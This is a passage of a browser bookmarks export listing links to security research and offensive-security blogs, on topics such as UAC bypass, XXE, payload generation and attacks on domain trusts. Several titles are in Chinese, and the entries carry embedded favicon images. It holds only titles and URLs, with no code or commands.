icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">First entry: Welcome and fileless UAC bypass – winscripting.blog</a><br>            <dt><a href="https://cobbr.io/ScriptBlock-Logging-Bypass.html" add_date="1515251973" target="_blank" rel="noopener">PowerShell脚本块记录旁路</a><br>            <dt><a href="https://lellansin.wordpress.com/tutorials/windows-%e7%bc%96%e7%a8%8b%e4%b9%8b%e8%b7%af/" add_date="1520516589" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACgElEQVQ4jQXBy24cRRQA0HurbnV19zzbDzkjg0Us4ViRUJDCDnasWLDiC/gP/oPPYBspQiyyYAOIReQwC+xAzEzGdmbsma5+1ONezsEfXi2+/+Loz6u710v/3dNZCf10UlgjyYPruSyxjbFv0rpJv79vKEd8+Y97dmgzje/WkRJXY5NpAeaQVGTWKDvXaq3L3NoyMxnQTCffx/1xdlrhg5NBjlpEa9q2QMB5TsNyFJPkRKjFh4Rbx0GiJUocI0tGJvTRWt2yEEDv+8moaD37LorAeGBoU7vdLgxzY8sMEUIMO9dqT4YsxNC1vu6groNve62g3R/jb4sOhJgTI6JGRAAQADCKEoBCjF1KiZGUSFSg6MefX8jkKCIlFk0WGDil0mZji03XxgAGM23gZvuhDdEYQ5v1Gw7X0VDwnBs7LAcqQe2849qASQE2Ieaae9egzuoU6MtPR4PxpKTpPj2KSnZUF4W9u1vl9nBip6Mi67cb2jpTVS4TBZHe/DdfXbTfPv1mPMZe0i+Xv165t8cH1cmjk21tm343cPAZndzUf12qVTWZ0KH5ZDYbHuR7bfAg6auPnutF8e72YuuuAcEl//ns2eT89NUfrzfcvb2v8acXL4uiSD4OrI0hNCFm5ShBO7+d/1tfr8Ky2/XhslvwelCV08cVGdLceo5pejTb3D9IV4e6ySh7Mjo/m54FaW9uFsvm74urOQQ7X21ove0gRA24vL3jFLQCwORTAyIQhUB/PD0+fjJSjZGD6qgU1ai9W8e7zpPRILKra997ZmZhAYwJEtJiXTdAhR59/fg5La8Xw0wQ0/nZ6fvFh4d7p9AgKAAGUQiKA+5VsyA2Kuau/R/F4occ4fA3AgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Windows 编程之路 | Lellansin&#39;s 冰森</a><br>            <dt><a href="https://bytecode77.com/hacking/exploits" add_date="1521383688" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC60lEQVQ4jWWTW2hcVRiFv33OyWQmmYdcpANKMBGbNJnYjmOdSaJWjQgJiJIHX4q11sZkTiOVWjTeIEGsNCWN1ktserEQCj4IIpIQRUoTsWiNUsWHPPjQgFAdECOVTGdOz5zlwyRDiD/8sDes9e+91l7bsKkGX/Z22pbtzn/lPvAY9U0j6TclcdU21sVA1pnqKfPjRrxZXwwMXKui9pb3bcvZB8YEgc+FL57iyao7GU29BYCQdn3WcfbyE/tfMKcGcwAWwIFRRa26LV/bVsWzYAyAZTk88vh5Ps39xsgPb6ydZsx175/+osl9CUTK17i1475z9S3bVd98l+q2tsupqJLthEttVwrQK/e8roIrtdRsldx35WcmTgE4Q38pHdg8sz7s+9Fhrpw4ttkajv50ZF0GAJYx/XJPTDmebj7nUFEm//rhBLFYDADP8wAIhUIAjP8yhiNTlhMEGnJMMejGge9Ghvn5vWM0NjYyNjZGQ0MDy8vLLC0t0d7eTm9vL/F4nOy1PwAIJF689Pn9DPx5w08cfEmt+7YJKPfMzIwSiYQAdXd3a3p6WoBCtiM/846ebrlXw3vu9tnx/GE/PtAm1xssk9va2rSwsFDez87OKpVKlQZYtvY079Sre5Pyv814lhW58PuDJ3dhrHIk6OvrY25uDoBoNEoikWBxcbHkS1CkoTPg7UwaGZadzqOdl42hUQhjDJKYnJykUCgAkM/nSSaTSCX3X9ub5EgmvfYSumhhmQ/KeWitoefQdlZWVsjlcgD4vk82m/0fGcCSfQaAoaI7fcDP6LZ4nablqufQDgGqrLQVDpc6EnHU0lSjbU21ar2jVql47DSAAxCxqt1V799mY0gD7J7oAiD2d56Pzz6MtcEfgIIXfBMOTx2Etb8wbsZXC9dvPhrdEjm3Dto90UW2Lkx//zxBUNIfBFJu1T8dDk/1ADdKgdpU5+V2FAP2S8WHwLr9k8OXTKsxV48f75ov5vkoVH3yykb8f/noOGzVtXF2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Exploits - bytecode77</a><br>            <dt><a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" add_date="1521690163" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACuklEQVQ4jQXBS2hUZxQA4HPO/987985M7kwSiRl1aNVAo7bGVwsVUTBQdKVQBXEhWWmWXWQjpCu3uhC6KF3UFhGNMCCtLrppaeMLdEx1Iy1YmyY6YSaZ5525j/9x+n0Ya5th3ZODK0+vvfzzCWST/RNHD08cOTk2LS3YBElSLFGDzUIiWEkGtsb4Mttrh3+9/jsoeatvf3r2vFo7vPLF3uPb/BIbdI2TIYmQYXAJAdgAghh0B631br22rpT5993y/K2vL1fmHyz/0qcuUoLKghUaBBECogCAYX8EInBIWs2I6Pvi16Xf5r6bv/rgmw620dHMhgHIAgIwAmCEpq3zlI87sepEXpNy2u+q+M6j+zcfVvrUs5SQVcTIiICApZFxn/1wLQxEXne0qpmiDgLKNTutGz/ffvymSoLIGrKgGTQCRs2+lzoTW3ZG631SAqTbrrVhrSdaUXujtdxYQ3ZBSyKwgADA5bFt4cagQCNT2/cWM0VDTr8XibYuRAKaiUgdQARLUhqyxMDwT/WNY73r89+aMF24d1f4bnnz1urrZz/8+P3BqU9OfXbCWraCJWsDggixtlrLuP5IftPQkHfpwkXf83yRPXPy9Mc7dk1OTAaZHBgDiNLx/FQlxhidqjSKjVIDCcVcgGxTEzKYmdMzDDo1ysWMcCWeP3+uHw3CKKouPVfW7Ns3NVwoBH4OLCuVZLJeLwqZASzG/XTuqzkMgoARUKKQMpfLMltHyvV6I44T6Yix0niz08rm8uVyOcgGX545Kz/Y/qHned1uZ7xUajY3Dh44MDxcaDQaH+3eQ0K8e/++3qhfmJmZPjZNkpIkwf9WVlzXfbH04uEfi4uLvy8sLLx8tTQ6Ovrpoc8BAACUMY4QhrUxRpBAw0wA9Xq9UqmEvc7s7OxQUATQUaQEEiEJISwzATNYBvs/irdoE92U064AAAAASUVORK5CYII=" target="_blank" rel="noopener">Windows内核开发教程第7部分：未初始化的堆变量 - rootkit</a><br>            <dt><a href="https://www.jarviswang.me/?cat=3" add_date="1521874948" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAC0klEQVQ4jQXB3W9TZRgA8Od53vf0Y9tpaXsKCsvWdjo26AYMtrmgoiRMIS5eaLwxxgvvNDFceO1/4RXhkjtC4IYEMAbC+BBxLbBs61rqETCsn9sKbc/X+z7+fqg8DaIbsEJBGsJ2w/6z/JuCFnu81zxyfPIbayADoFA5gqPAgJ6jyUAiaPdLj9evv6pvZUYzU2PnvL4urt9q7JQnMnP5sdOmkVI+IAbosvaC+upGYdO+m7LMmUOLqdhkoKKSgLD3z+sHhdJN3zOmx89MZGaQJVZ3lu8/vhqm2OzUqRFrDiHiBQAUCAoQDALhQn39xb3ixu1kMvZB/lvx4VfpoSFzaeHn+EDO8fo9byscijFu13ef1Zq1Tt8JRdRoYm505ORqpaA1SVbJdOI95DgD19prxdK1Txd+vF+81tx+GTMHu289JPXR8R/eSQzHE4ohkKRivucCaED2taeE97L1vNxY+XrxfMrIE+DvDy9UqpsHZvZr9YZQSxA1IiRkxSSMqKth0BweMvfc/OuiZeYSRiab27svkVeoSCMEBvloCB1nQAEYgO+SEw+/uzT73cH0x1L0a531e4UbhfJ1BW8ZYihIMkmmXeAWQCoIRGQgUqoud9pPFxd+AdAExnLl0ma1cGKyyxwBDknGDskcQkoBgNR+N3Qg+/4L+87lO7+a8ST7Zm13ZTx7bABHiOKMLSnVUKPd5DFXQDQspQ5UMm6d/eR89dWznlcBIzSR/X6/NdnVzZ03lfSeCSy37z5auSGJjx2et7f+qzXrS6d+ClNE4iCBIhAK3FX7QWHttmVF56e+wIAbjnKelB7+u/VUKz179LNc+qSrXSJPgLRrfxdLV5UPh7NfjmdPEAaoXJ8FoJA93dPcKtsrnY4znT/T7TWebPzR2i4fHJ3Oj582xYivANFHdrQW6JPS2CfwXzfsR2tX+rqj0Ldiw/OHPk9FjwITayURAeh/VP5sn7iA8EAAAAAASUVORK5CYII=" target="_blank" rel="noopener">Web开发 - Jarvis&#39;s Blog - 白帽子、全栈、嵌入式工程师、iot安全研究者</a><br>            <dt><a href="http://deelmind.cn/" add_date="1521774201" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACfUlEQVQ4jS2OS28cRRRGv3u7+t09PQ97xmNsRRiTKAsvUMQiiIfEhn/ACoklS/hLIBbwA4iEsggbJAQKRCSykIMIGEw7tmdsz6Omp7qqLgtzlkdnccg1pwSICESIyXoYK9Y1zrk4zvOigNHeC0BEAKAIgAgRgel62Zz9/evq+Ad9dULg4e23EW91t2/3qg68EzAD5Fc1iIw1c72a1c8uHn9x+uIQUKwCFQZaezu4/96Hnw43NsVZImYhEpFAhbN/n549/nJaH1/P/GymRVRY7BR5dPXbtz89+JxuVkiYRIiVnk+Of3k4rf9pdGNsAI4RlRKPwqw7HKRN/eP5n08oTOA9i3hS4dnx0dVfT8TqKB/2huNuFatsu3zlwMWjrDPoRIuTo58RBCJgEIn4rDtO88Ahm5rNNA2zqursv4NyLyj3GuuWcx1EFREToEiIxEVJ0VJV7h/MZwmSxWv33kpHB989+l75avTqvfq8ff3ND/xaE5MShlibFeXO/Y83Bv3opeh1c+vgfXhzZ2+XbH9869197iZp7lpLzOSbUxFh5sba85MXm36R7L3RGiPEkZLp0aHb2O11OswMgIjINzVAIsJMK2MvLs52d3YhIuJN6/S66RaFeA8CCUAgWZ16EgKJCAjz1eqP57+PNjfSory8vByPt2IVAQKAABCxAMCNgThfdQdZEk7q54EK8zxLk1Tk/+QGBQAgIXAQQnyr5/3R1uDOXVbhYj43xoQqIGLvnAAEKBAAMW07m1xMrqa9/tZaa0XKOXs9u3w5qbtlvyqrXtUBBCJq3bbL1TJS8eHRs6+/+Wp71O9kfD5dWLeOk9gY9clHn+VFvtBLJsqy7D+rA0dsNmiv6AAAAABJRU5ErkJggg==" target="_blank" rel="noopener">DeeLMind-Blog</a><br>            <dt><a href="https://toddcullumresearch.com/2017/07/16/portable-executable-file-corruption/" add_date="1522049404" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAABb0lEQVQ4jaWQT0sCURTFz70zjZG+XMgME+hErQehaC0I5UdQxIXroG8i9Amkva1mIYi4FFy1aeUuGBAnsGgROArNvBYP/+SfWvRbvXfvPdxzDwEgIiyQUi6/Ukr8HwJQqVRc1w3DkIiazWYul6tWq/1+3/O8bYEGwDAMx3Ecx2m325lMplwud7vdWq02Ho9Ho9G6YQAaEQVBEIZhKpVqtVqlUsn3fc/zptNpFEW+728IdHVlMplMJBJEJIQIgoCZO53OztNZleI4lguYWUophEin09s3sNpIRMwMYDKZ5PN5KWW9Xi8UCgCYf1hitTGO49lsBqDX62Wz2UajYdv2YDBQnlaBLhFCmKap3pZlFYtFIcSqa+CAsUO2gerdXuJE4CvG4xDDN+g75oiW4UggaeDhGTqhdL5HsMyRCFLi5QOuidNjPL0CKtZ9KOGhjoKDCxtPwS+za9xdIaHh5gz317COoP0pmEf4nGP4DiZojG/qLJBEVYk/xwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">便携式可执行文件腐败防止恶意软件运行 - Todd Cullum Research</a><br>            <dt><a href="https://hawkinsecurity.com/2018/03/24/gaining-filesystem-access-via-blind-oob-xxe/" add_date="1522049413" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACzUlEQVQ4jQXBS3PbRAAAYEm7euzqbQsrSh3LedBApo+UTjPTAj0AnQ5/gAtDuXGAX8KFY39KTxx6aqFASmkIToA4UW0ndRLrZb1WXm2/j9/9cf331/HeuDC1+uHNztEZOZ7SacgYrVUs9D3pg558clE8exUaWF9bNsBNXxq+jW7cdbeve+Oz8uwyUWSYxAWhuWvjoqwqKrQ9+9rddjBJx+MU7PREEVfffH+bFsXPT49c17RMYWtV3tzQZVwjrJ5MIlkqv/puO03y4eEF//hrfeeO+3R3BBWx4xpJEN6+ZXod1BBaceDFL5OEVxBSgtFse3PJEhj49hN3+CakVOR56DnNp/faisIO92aj/2LVEDa2VGTDYJjXBUjiCssSuP++dhkRZxl3UHFj0wBac/jPVEYmxjguEwa51RWnmKYKUjLChse5QDgYZqUl0Z07y2XFBn/NVb2fxDItFJV1SAb/PRhf/6i1tqJEM45yWIjTREei7YoC4k+D0LPaL18kz3fnv71O9v9I1q6slxmt5pluyhIktK7Boy8sETKkiwu+WG5jRsk8Xvi+2199T+NrwCLDgUwWgynRkVzmJfjhS6eqyCwmDc+MJbFlg6UOoHnZ0Lzb5fQukSxx//8yjbhF2nzY18GDDdT2NEPNeNU+PSeyxpkaUyVqKAvDg5kovNzPUQvTNMMKkmRReBvObVP4/MHV48GExCA4YaNowSGI2vplTvcHuVCjYO/i/r3u1S38d1DyT376LDgaOC3a0eDBQdxyrdOzqEwaRZahXHd9M57mnouwg4JLDghtoeP7FrAnr7JFRK+te01OFArWWranyCxr0mnVWzJ0id/79ZRVkt/zwMfduUaha5tvJuf9FdRy1HrR8KwRkWA5cNVvyVz95+BipddTNDw6n4GHt8wiDXlWX3EloOQkJxEnHg7DMC38DVtoGAR1Q2HOgThJoYneAbv/Zj1QPO6uAAAAAElFTkSuQmCC" target="_blank" rel="noopener">通过盲目的OOB XXE获得文件系统访问权限 - 不断发展的Web安全博客</a><br>            <dt><a href="https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/" add_date="1522050620" target="_blank" rel="noopener">Tales of a Threat Hunter 2</a><br>            <dt><a href="https://theroadtodelphi.com/2010/10/21/wmi-delphi-code-creator/" add_date="1522116004" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAClklEQVQ4jQXBTY/bRBgA4Hln7LGdOLZ3s+x2VbIrSFBbbbo5coAKiRsSEgcOcEAcK34l3EBqT5WQWrTQj82SmKyTOLZnPN/D85DxeIjAfvPselzEgO3iyeTxbExpmAzSxZPJp5ep9z6N6fOfvu0l51IGAJCNhh75lomIgkXKITqfnebRoJWsPPg4gj3XbcecdwEhAQLAgDvWt9wkcV7vVUBwKdqO2rxItawZc73yddMqaTxCGCFkjL7fHSzgaDgkGLTW92V9lIx++fn5+PgjLrT3sKtbZbS1HltrjXWHTljrZC+1tgSHIcLO+mpTTS8uEGilVdNyY0xIAAthPcKMCydb8Ie8oGGAs2Gkep7Hke55kadJTA9NJ6UBgAAQCK5DDIMBoQn5b9cp6ROA85Ozmnd3uwoQSeJ4f+iEtggw1lpba4Qy1iHWOKToat1sGtk7owieXMyOisI5LZVmTEqhCQLkvccYEYzO8tF3X3+eROnV5cO90lk2WN6VXDpCQAuRZsnDs2MCGEcROhlHSnulfBiGN29Xp/noZrUZZ/HNu2XDRNNw3vPT86NiOCSEQEJRL0zDHCbBn3/faqWV1jfLMs+Hm13TNMxa2/Xs6npe7VsyPc7mk9PrpxPk0bpi1iJlDCYooriuu8XjaVnVjDEAT0OUHxfw/ReLkyK8mBZn55+U67sPq/VvfyyfXg6eLWbvtraVdvzgY0+DX39/QQPacEF+/OGrR/OZw0m1ZZn768v56NV7G8eU0GSQp7dVFQInYG43++nlrO0ZkX27XJXlZldWWxqnvQ5evP43SkfcIofd9dVnR3nuRUeQffnmn14rMnmQbbd7rXrkxKFjy0273e2VFkaZ1JNm2wVpVt637z+sy/uG4PB/RYqZwU5BUdcAAAAASUVORK5CYII=" target="_blank" rel="noopener">WMI Delphi Code Creator | The Road to Delphi</a><br>            <dt><a href="https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Privilege%20Escalation%20%26%20Post-Exploitation.md" add_date="1522415703" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">Infosec_Reference/Privilege Escalation &amp; Post-Exploitation.md at master · rmusser01/Infosec_Reference</a><br>            <dt><a href="https://redcanary.com/blog/lateral-movement-and-cryptomining/?utm_content=69603684&utm_medium=social&utm_source=twitter" add_date="1522936441" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACvklEQVQ4jX2STWiUVxSGn3O/n5lQm3FMo0ljadVWA5UquFBSCu3SRcmqnSwKkmJF24S6tlAtYn9A3Kmo2AhmV2GodqwaO9S0ILQG0RpTSyVtFEUUMxonM/nm3nu6yEzMovjCgXsW59yX57wCtAFfA68CBoiAoP6WejWkQA2wwF/AjhDYlcvlNr2fy+HjGK1WMVGEWotaC/J0XlVRVaIoIp/Prx8cHPQAF34oFJyqau3seXt/8zZX2rnbqXX6LBUKBQdcCIGkUq2KPnrsxvZ8I9OXLgliZOGfN1h+9BCmKY23FjEGEVHnnEZRpOVy2QCJAcQniUimOVi66zOJW1ok3baE8k8/M9G3HT9ZIoxjjDGYIJDAGBGRoMHHACLGgCpNq14jXJTFz8wQZJqZzJ/k377t+PL0LEnv53jILBsxc40IQTZL1NoK1qLeE73QQunHs9w7eJjGJw2oqgr1U6H1rUFTkyx4cwOuUpkdcI6g+XkeHDvOzMQtMAZ1DsD5uhszzw6o6uKPPiS9ciVuagpEkCgmuXuXh/nvERHCIAAIMpnMPAd1O95a4o4Olh3ZT7i0g+TJE9Ra4jjm0anT+CRhqlqlWCy6gYEBAMJ5KfPOexFreW7NG6z64nNSr7zM42ujXN79Jdmrf/DtB5vY9/cNFgQBZtYJIaDGGACTSqUAKA0VGb5zm/O/XyQ+V+RKbZpt69ay4vQ59u7ZycZP+6Vw8hTvdndrCGiSJDo2NuZP5PMy+suvkr12nd9aFvL66tW89/FW+t95m8Wtrdzb8gkMX1Tp76NcqWiD/3BnZ6fr6uqa6enpqR09cNDeGR+3/5vfh5M6sbG7pklNC0NDc1G+mUql3urt7Y1fbG8nTqcZGR0lGRmhZu1caEQEMYbSS+3hohPfkT9zxgDjArQZY77y3i8HksZlniEPxMA/wI7/AGvoWuu66v96AAAAAElFTkSuQmCC" target="_blank" rel="noopener">威胁检测4422：混合横向运动和加密</a><br>            <dt><a href="https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/" add_date="1523109468" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAB1UlEQVQ4jXWSTWsTURSG33PunUySZmzHxhQqFhmbEqViCVS6UDci6s6NuPcPuHQvrvwF7rvvViiCOxEKdVcXltKFUdKakthkkvm497hop5lIPLsD54H3ee8F8kOkmAF9vqBApBmUP1ETAJNYcVRxtX5lLfDJmk44JIbI/wDhW0vzm+8evXreePFsxdEz258PWLFYmQqQo/j9m8f37swO4tRE0lj2dvfah61TyoXiLDwAaTaqzZuz3Z6Y1BHHqXmlzbdP1tcWRHDB6Cw8jKB+wy+6Eov+3el++PjDr3ir9drV6uUdtIlIRMaAEAEy55VcrcMorS54W9sHX78dlV09jCwAm2lkkc6FtIJrLBVL9Ppls0AURhac6+hCmohEsBzMPdxYNGYURfp24Hte+dPOLxIS2H+lz/Lt73fCoWZSRGYUDzfuLjnKWkknnioDAGDve/dn+4/SRUiq+FLvqG8TCzhTgDMH33cqFW2NECgyg+C6X5t3gWQKwEwAnj5YCRaLxsbiupGk12r6/noAgHkMZLUCALphcnw66oehistkuDdCfxABjJx0BogAaLU6X3aPk8Sw7ac6Vigftk9AJOP7ia9LXqU046pEBDAsVCB1EiXDMEWuqL+u1MVGV/bvoAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">使用SharpShooter生成有效负载 - MDSec</a><br>            <dt><a href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/" add_date="1523414122" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACeElEQVQ4jY2TQWhcVRSGv//eO/NmUkMMQ91YChaqrzZRKlKkC3EhKAgiIq4kdmM0kW4KKm0EQ6lWoXRZDYqoiNrqQq1IQcnCrS7EkjAaK7qwCGMp2KRv5r137+lCkqAdi//qcM5/zvnh/AeGYt79vxzoWtJ8AtixY3qslWlOSf1Ll39/9cKFM1f+zRky4G/szmemndxzZukHoCHndqZkry11T75zXQUT+VP7pObLQNuMoxCpI4TgGzIOgdXJ0otLP76xuN7jN7beNnskhPa7yeqzdVkelXcHJO13Tg+S6NQxzjv5S5KOb+3cfVPv4ndfAziA/OapTqzLz2Iq35fcfaHZ+NAZP//RG+zpV3/dZaRfQ8OdAhstk7s/RT6d3D4zDhAA3JYtT0qMFGVxuN1sf0upR5OvqpGRfsjqZmbwURSng1h04nPveDgG+w1YcAASI5L2htAax9Iv/bViBd/44Ib22EPWyp5QQ293u9+cA1v2qRwD7nFGtqHAjCgoYnSxESzL4mpxea21tyj+rEZHx31KxVvbuN0byuRCAlszU9wYIEcLaIRUOfCjS72PrwAJoNfbvNKNPONSTeGCyxy2qYAUvyqxL1b7Ot9psjqRz54dxOr5lZU3vweYvHU6N/kjkrszqb5FqZpLJvcPH0zkM4cx7qhIxwN6RNJ+w06DGwBTBu8JNb0LB+tUzi13X39l44yAq4lnTMQg/wnGxVjzmKRtEnldDR6X7LzDHkhWnTKxuN57jZV37Xz6Xu/9MclllQ2OBfxA+EMGTaX6pXM/LXz5X1Zejw1g967ZKaEXZClEdGK5e3JhGG8INt92cvvMeJ4/2xlWW8dVNAcGI++CC7oAAAAASUVORK5CYII=" target="_blank" rel="noopener">攻击域名信任指南 - harmj0y</a><br>            <dt><a href="https://posts.specterops.io/remote-hash-extraction-on-demand-via-host-security-descriptor-modification-2cf505ec5c40" add_date="1523499736" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACNElEQVQ4jWVS0UvTURQ+597rr/3GVqHpGDRalBmSEayxeqjMkCSXBj0YlAVCPUToQwT9FxUEQQ9qj0VZQla4zVk9WCo4s9yMorGEKAhcOX+b+917erhz5TpP91y+8517v+9DpRQiAgARISIRAYCUChEYYwCgL/9iiEiDdEmpGEMNVUoRkT7rQkRUSulGKUUEQnAAGOyPVhni7LlmALCLEhmUx0oDZaZYNDHYH91R71WS0unvPT2tzS17NZ1+Feq9ADg/n7k3EFtZyR9r3ff50zcE8G/3REZnDKPq4qW2PU3bAAgR2Ro9ppKLY7GE3+95MTxtcGEI8XRo8vCRpsZGXyqVYQj6q2jbknN89fL9ci6fy+UH7kau3z4TaKiXIN+l0jeuPbzcF7as1Zoa94GDu0kRFou2EHz4ycR4fC4YqpdZ9eO0pJ9kFfMeX7X7kZ2V1ofZTLgjeLwtoKQUZQcYQ2nTUmH5al3nb3ceAVym407hmWkajGPJB0CGiIjodG4IhnZ5vdXx8bnsUs5tOlymw1opxMcSTqcRCjU4HAYAlVRSiojo+chU9pdlWauR0ZnOUyHO2cjItG/rlqnJj1d6T7aHg4hQUgkAOGe1dZtjkcRC8mv3+aPJ5OJs4ktX1yFErK3b5N7o5Jytc7ps3IP7rx8PTQT27xScvX2zcKI92H2hpdK4tWgQEHHBC4XirZvDti17+zpcLlNKCfBPNP4LnxRClFstemX4KuJNBHotK0m4Lt5/ALfpMzxKKUoXAAAAAElFTkSuQmCC" target="_blank" rel="noopener">通过主机安全描述符修改，按需提供远程哈希抽取</a><br>            <dt><a href="https://www.endgame.com/blog/technical-blog" add_date="1523508740" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAABS0lEQVQ4jZWSPUpDURCFv3PfNSRiJYLiAsTKCFbuwSVYCG7CDdi4BJeiNukshGAjpBIEtbAxGImJ791j8d5Lnj+gTnPhMnPmzHwD/wyVT0d0lxBYyPW3MQTITf+VdzcKNjv0thUAqbCRACeDojzM2e37KQeIAkMy40QGCRaDFgTgUGVMQqmAIHpuTkBL9Ed+mBBVOiKTX3LeitJj3QEhnGAx4+TOF8PZkDPBKuJ8dimYSWJvhfW2I0qQcDvQe2YwppSOTalMvCX2V3WwVjnMzXLkcODBmABFs2DWKtm5kQzKzbtJ3y3VqbQDpw++fGFBJGxoiasRUJXF+Wh2glagN+Ts+QfGbpLeaHPeDQFi4ObVj1Oyaq0SzhNHt9xPG+DqO2CatLWknRKcAQkKOL7zJ3BBdAIBEIVduOYiZNJc9NfjEzKG6xHjrwz/Fh9ENpsWo8P7cwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Technical Blog | Endgame</a><br>            <dt><a href="https://xiaodaozhi.com/" add_date="1523625393" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAADCUlEQVQ4jQXBW0xTZwAA4P9+2p6WXmgBix2tSMrippIp6opZ1GyoQx6mD2rGsviwxWQPhkzni3tezGayvckenG8m7GXXdGEuYrBByxBhotyl3Epbim3P6Tk9l//f98GPvisKACgEAHAEBII2IxjSOq5uClvFcgALjqDADCMgkIDERTmBQgBBMKSUWTa2lDVUnvJWR4A7rDk/JUDjCFqVbdntwhASt8PGEFBGOUfb+cWInKvlh/zGELDUsaWEQ4lBM49LSy1sMisdbuz8jDgYooSq5U2Plj4QyuTmR+fmF6Y3lELZefV6bP/BwrXLNzPLG/abDTkbxrouI0YkruUSjjvHvfcy81PDT18nR9ZdjZ3HPuhZfrnQtst7uvvwSq468fC/8K4OB8WEMlIrbAbB8FKRj7+wF5/PHH//3LUb/X/99svfg8m+E0c+6T4Y9fmSqUzg6AXAVYIQB0KaXa+MZ8Cj4dlTp87evjNQ3Fod+v3XUCCoKZrsYicOtZYaumaAF0MTOSBgkgydrlcrRntrxOdmP92+de5Mz+rKSjTo80iSYYuqrlVUFUFIEEKYa7K/edtqa65H/V9/UcpNf//NTUMpdbeHe+MhXTFNU+R1c71a56QEAoMA4qCUVHCzj9xXVav/yqXXqXFazjZJHDixpuq+EHswxQ3PHhmImi0hoOfNzcdVi7mD4bE/7moGje9vb4k0E0+QeIN1O3yPZstzoMvl3